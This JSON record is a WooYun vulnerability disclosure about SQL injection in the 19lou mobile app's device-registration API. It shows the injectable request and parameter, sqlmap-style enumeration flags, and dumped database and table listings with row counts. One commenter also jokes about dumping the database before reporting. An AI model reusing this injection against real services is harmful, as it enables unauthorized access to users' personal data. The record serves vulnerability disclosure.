{"id": 7009, "wybug_id": "wooyun-2013-043309", "wybug_title": "十九楼App客户端Sql注入威胁多数据库", "wybug_corp": "十九楼", "wybug_author": "zzR", "wybug_date": "2013-11-19 11:31", "wybug_open_date": "2014-01-03 11:32", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["手机应用", "敏感数据未加密", "手机软件安全"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-11-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-11-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-12-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-12-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-01-03：\t细节向公众公开  简要描述： 由于App客户端数据为正常的HTTP请求，并且未对客户端用户数据做过滤，导致了此类注入。看到厂商之前的都是Xss和Csrf，试试有没有Sql注入呢，还是在这里找到了突破口通用OR NOT？ 详细说明：  浏览抓包\nPOST /notification/SaveDevice HTTP/1.1Host: mapi.19lou.comUser-Agent: 19?￥? 3.3.1 (iPhone; iPhone OS 7.0.4; zh_CN)appid=3&token=b3&deviceToken=&guid=&restTime=&restDuration=&isReceive=&uid=&city=\n注入参数deviceToken   漏洞证明：  \n\n--current-user --current-db\n\n内网IP--dbs\navailable databases [20]:[*] haodian[*] ibdata[*] information_schema[*] mobile_common[*] mobile_content[*] mobile_forum[*] mobile_haodian[*] mobile_mapi[*] mobile_mybaby[*] mobile_notification[*] mobile_novel[*] mobile_statistics[*] mobile_tiaozao[*] mobile_user[*] mobile_wecatch[*] mobile_wedding[*] mysql[*] performance_schema[*] shopping_post[*] test\nmobile_user\nDatabase: mobile_user[25 tables]+-----------------------+| admin_permission      || admin_user_permission || admin_user_setting    || invite_friend         || qq_site_user_info     || session               || sina_site_user_info   || user1                 || user10                || user11                || user12                || user13                || user14                || user15                || user16                || user2                 || user3                 || user4                 || user5                 || user6                 || user7                 || user8                 || user9                 || user_medal            || wap_shipei_mobilebind |+-----------------------+\nqq_site_user_info     |session               |sina_site_user_info Database: mobile_user+-----------------------+---------+| Table                 | Entries |+-----------------------+---------+| user11                | 70817   || user1                 | 70806   || user13                | 70744   || user9                 | 70726   || user14                | 70692   || user8                 | 70653   || user5                 | 70626   || user4                 | 70586   || user7                 | 70573   || user15                | 70528   || user3                 | 70527   || user16                | 70511   || user12                | 70509   || user2                 | 70357   || user6                 | 70355   || user10                | 70336   || qq_site_user_info     | 1805    || invite_friend         | 551     || admin_user_setting    | 229     || user_medal            | 183     || admin_user_permission | 61      || admin_permission      | 40      || wap_shipei_mobilebind | 7       |+-----------------------+---------+这些是……具体有多少users 就不给你跑了   修复方案：  NULL   版权声明：转载请注明来源 zzR@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2013-11-19 11:33 厂商回复： 收到，会立即处理· 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-11-19 11:33 |    \t\tMr.leo \t\t\t( 普通白帽子  |\t\t\t        Rank:1314 漏洞数:176        | 说点神马呢！！)\t\t \n  mark    \n     2013-11-19 11:36 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  @十九楼 实在太快了！    \n     2013-11-19 11:39 |    \t\tMr.leo \t\t\t( 普通白帽子  |\t\t\t        Rank:1314 漏洞数:176        | 说点神马呢！！)\t\t \n  @zzR 自动化确认技术- -    \n     2013-11-19 11:49 |    \t\t十九楼(乌云厂商)\t\t \n  @Mr.leo 人工快好么亲·    \n     2013-11-19 12:24 |    \t\t带馅儿馒头 \t\t\t( 普通白帽子  |\t\t\t        Rank:1278 漏洞数:143        | 心在，梦在)\t\t \n  @zzR 洞主v5    \n     2013-11-19 14:43 |    \t\t灬相随灬 \t\t\t( 普通白帽子  |\t\t\t        Rank:369 漏洞数:68        | 大胆天下去得，小心寸步难行。)\t\t \n  @十九楼 好快的速度！~~    \n     2013-11-19 15:56 |    \t\tg00 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 终于进来了~)\t\t \n  先脱裤，后提交，~不拖悔恨终身~    \n     2013-11-19 17:20 |    \t\tyhoojj \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:14        | BurNing)\t\t \n  @zzR @g00 脱毛？    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}